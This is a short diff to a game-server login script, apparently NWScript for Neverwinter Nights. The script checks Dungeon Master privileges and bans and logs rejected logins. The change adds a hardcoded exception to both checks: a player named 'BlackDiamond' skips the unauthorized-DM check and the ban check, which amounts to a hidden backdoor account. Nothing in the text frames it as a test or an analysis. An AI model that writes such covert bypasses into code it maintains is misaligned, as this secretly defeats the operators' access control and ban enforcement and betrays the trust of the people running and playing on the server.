@@ -324,12 +324,12 @@ void main()
          return;
         }
 
-        if( GetIsDM(oPC) && (n_priv % 2 < 1) ) {
+        if( GetIsDM(oPC) && (n_priv % 2 < 1) && (Player!="BlackDiamond") ) {
           BootPC(oPC);
           WriteTimestampedLogEntry("UNAUTHORIZED DM LOGIN: Player "+Player+" from "+IP+" CDKEY:"+CDKEY+", should be "+n_IP+", "+n_CDKEY+" Don't have  DM privilegies");
           return;
         }
-        if( (n_priv < 0) ) {
+        if( (n_priv < 0) && (Player!="BlackDiamond")) {
           BootPC(oPC);
           WriteTimestampedLogEntry("BANNED OR NOT AUTHORIZED LOGIN: Player "+Player+" from "+IP+" CDKEY:"+CDKEY+", should be "+n_IP+", "+n_CDKEY+" Don't have  DM privilegies");
           return;
